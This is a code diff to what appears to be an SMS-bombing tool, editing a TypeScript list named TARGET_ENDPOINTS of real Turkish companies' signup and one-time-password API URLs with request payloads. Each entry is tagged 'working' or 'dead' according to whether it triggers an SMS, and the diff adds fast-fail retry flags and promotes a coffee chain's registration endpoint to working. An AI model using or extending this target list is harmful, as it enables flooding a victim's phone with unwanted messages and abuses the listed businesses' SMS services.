@@ -49,17 +49,16 @@ export const TARGET_ENDPOINTS: ServiceDefinition[] = [
     status: 'working',
     category: 'Market',
   },
-  // ===== MIGHT WORK - OTP GEREKTİRİYOR =====
   {
-    id: 'english_home',
-    name: 'English Home',
-    url: 'https://www.englishhome.com/api/member/saveMemberAndLogin',
+    id: 'kahve_dunyasi',
+    name: 'Kahve Dünyası',
+    url: 'https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number',
     method: 'POST',
-    payloadInfo: '{"Name": "Test", "LastName": "User", "EMail": "{{EMAIL}}", "CellPhone": "5XXXXXXXXX", "Password": "Test123!", "GenderId": 1, "GivenOtp": "", "EncryptedOtp": ""}',
+    payloadInfo: '{"countryCode": "90", "phoneNumber": "5XXXXXXXXX"}',
     status: 'working',
-    category: 'Giyim & Ev Eşyası',
+    category: 'Yemek',
   },
-  // ===== DEAD - SMS GÖNDERMİYOR =====
+  // ===== DEAD - SMS GÖNDERMİYOR (fastFail = sadece 1 deneme) =====
   {
     id: 'onur_market',
     name: 'Onur Market',
@@ -67,6 +66,7 @@ export const TARGET_ENDPOINTS: ServiceDefinition[] = [
     method: 'POST',
     payloadInfo: '{"phone": "5XXXXXXXXX"}',
     status: 'dead',
+    fastFail: true,
     category: 'Market',
   },
   {
@@ -76,6 +76,7 @@ export const TARGET_ENDPOINTS: ServiceDefinition[] = [
     method: 'POST',
     payloadInfo: '{"phone": "5XXXXXXXXX", "email": "{{EMAIL}}"}',
     status: 'dead',
+    fastFail: true,
     category: 'Bebek & Çocuk',
   },
   {
@@ -85,6 +86,7 @@ export const TARGET_ENDPOINTS: ServiceDefinition[] = [
     method: 'POST',
     payloadInfo: '{"phone": "905XXXXXXXXX"}',
     status: 'dead',
+    fastFail: true,
     category: 'Finans',
   },
   {
@@ -94,6 +96,7 @@ export const TARGET_ENDPOINTS: ServiceDefinition[] = [
     method: 'POST',
     payloadInfo: '{"phone": "905XXXXXXXXX"}',
     status: 'dead',
+    fastFail: true,
     category: 'Finans',
   },
   {
@@ -103,6 +106,7 @@ export const TARGET_ENDPOINTS: ServiceDefinition[] = [
     method: 'POST',
     payloadInfo: '{"phone": "905XXXXXXXXX"}',
     status: 'dead',
+    fastFail: true,
     category: 'Finans',
   },
   {
@@ -112,6 +116,7 @@ export const TARGET_ENDPOINTS: ServiceDefinition[] = [
     method: 'POST',
     payloadInfo: '{"phone": "5XXXXXXXXX"}',
     status: 'dead',
+    fastFail: true,
     category: 'Yemek',
   },
   {
@@ -121,6 +126,7 @@ export const TARGET_ENDPOINTS: ServiceDefinition[] = [
     method: 'GET',
     payloadInfo: '{}',
     status: 'dead',
+    fastFail: true,
     category: 'Spor',
   },
   {
@@ -130,6 +136,7 @@ export const TARGET_ENDPOINTS: ServiceDefinition[] = [
     method: 'POST',
     payloadInfo: '{"phone": "5XXXXXXXXX"}',
     status: 'dead',
+    fastFail: true,
     category: 'Finans',
   },
   {
@@ -139,6 +146,7 @@ export const TARGET_ENDPOINTS: ServiceDefinition[] = [
     method: 'POST',
     payloadInfo: '{"phone": "905XXXXXXXXX"}',
     status: 'dead',
+    fastFail: true,
     category: 'Giyim & Ev Eşyası',
   },
   {
@@ -148,16 +156,8 @@ export const TARGET_ENDPOINTS: ServiceDefinition[] = [
     method: 'POST',
     payloadInfo: '{"phone": "5XXXXXXXXX"}',
     status: 'dead',
+    fastFail: true,
     category: 'Bebek & Çocuk',
-  },
-  {
-    id: 'kahve_dunyasi',
-    name: 'Kahve Dünyası',
-    url: 'https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number',
-    method: 'POST',
-    payloadInfo: '{"countryCode": "90", "phoneNumber": "5XXXXXXXXX"}',
-    status: 'dead',
-    category: 'Yemek',
   },
   {
     id: 'wmf',
@@ -166,6 +166,7 @@ export const TARGET_ENDPOINTS: ServiceDefinition[] = [
     method: 'POST',
     payloadInfo: '{"phone":"05XXXXXXXXX","first_name":"Test","last_name":"Test","email":"{{EMAIL}}","password":"Test123!","confirm":true,"date_of_birth":"1990-01-01"}',
     status: 'dead',
+    fastFail: true,
     category: 'Giyim & Ev Eşyası',
   },
   {
@@ -176,6 +177,7 @@ export const TARGET_ENDPOINTS: ServiceDefinition[] = [
     headers: { 'X-App-Type': 'akinon-mobile' },
     payloadInfo: '{"phone": "05XXXXXXXXX", "first_name": "Test", "last_name": "Test", "email": "{{EMAIL}}", "password": "Test123!", "confirm": true}',
     status: 'dead',
+    fastFail: true,
     category: 'Spor',
   },
   {
@@ -185,6 +187,7 @@ export const TARGET_ENDPOINTS: ServiceDefinition[] = [
     method: 'POST',
     payloadInfo: '{"phone": "+905XXXXXXXXX"}',
     status: 'dead',
+    fastFail: true,
     category: 'Giyim & Ev Eşyası',
   },
   {
@@ -194,6 +197,7 @@ export const TARGET_ENDPOINTS: ServiceDefinition[] = [
     method: 'POST',
     payloadInfo: '{"phone": "5XXXXXXXXX"}',
     status: 'dead',
+    fastFail: true,
     category: 'Teknoloji',
   },
   {
@@ -203,6 +207,7 @@ export const TARGET_ENDPOINTS: ServiceDefinition[] = [
     method: 'POST',
     payloadInfo: '{"phone": "5XXXXXXXXX"}',
     status: 'dead',
+    fastFail: true,
     category: 'Market',
   },
   {
@@ -212,6 +217,7 @@ export const TARGET_ENDPOINTS: ServiceDefinition[] = [
     method: 'POST',
     payloadInfo: '{"phone": "5XXXXXXXXX"}',
     status: 'dead',
+    fastFail: true,
     category: 'Market',
   },
   {
@@ -221,6 +227,7 @@ export const TARGET_ENDPOINTS: ServiceDefinition[] = [
     method: 'POST',
     payloadInfo: '{"phone": "+905XXXXXXXXX", "country": "TR"}',
     status: 'dead',
+    fastFail: true,
     category: 'Kozmetik',
   },
   {
@@ -236,6 +243,7 @@ export const TARGET_ENDPOINTS: ServiceDefinition[] = [
     },
     payloadInfo: '{"gsm": "5XXXXXXXXX"}',
     status: 'dead',
+    fastFail: true,
     category: 'Giyim & Ev Eşyası',
   },
   {
@@ -245,6 +253,7 @@ export const TARGET_ENDPOINTS: ServiceDefinition[] = [
     method: 'POST',
     payloadInfo: '{"gsm": "5XXXXXXXXX", "action": "register"}',
     status: 'dead',
+    fastFail: true,
     category: 'Dijital Hizmetler',
   },
   {
@@ -254,6 +263,7 @@ export const TARGET_ENDPOINTS: ServiceDefinition[] = [
     method: 'POST',
     payloadInfo: '{"phone": "5XXXXXXXXX"}',
     status: 'dead',
+    fastFail: true,
     category: 'Market',
   },
   {
@@ -263,6 +273,7 @@ export const TARGET_ENDPOINTS: ServiceDefinition[] = [
     method: 'POST',
     payloadInfo: '{"phone": "5XXXXXXXXX"}',
     status: 'dead',
+    fastFail: true,
     category: 'Yemek',
   },
   {
@@ -272,7 +283,18 @@ export const TARGET_ENDPOINTS: ServiceDefinition[] = [
     method: 'POST',
     payloadInfo: '{"phone": "905XXXXXXXXX", "sessionid": "", "confirmed": "1"}',
     status: 'dead',
+    fastFail: true,
     category: 'Oyun',
+  },
+  {
+    id: 'english_home',
+    name: 'English Home',
+    url: 'https://www.englishhome.com/api/member/saveMemberAndLogin',
+    method: 'POST',
+    payloadInfo: '{"Name": "Test", "LastName": "User", "EMail": "{{EMAIL}}", "CellPhone": "5XXXXXXXXX", "Password": "Test123!", "GenderId": 1, "GivenOtp": "", "EncryptedOtp": ""}',
+    status: 'dead',
+    fastFail: true,
+    category: 'Giyim & Ev Eşyası',
   },
 ];
 
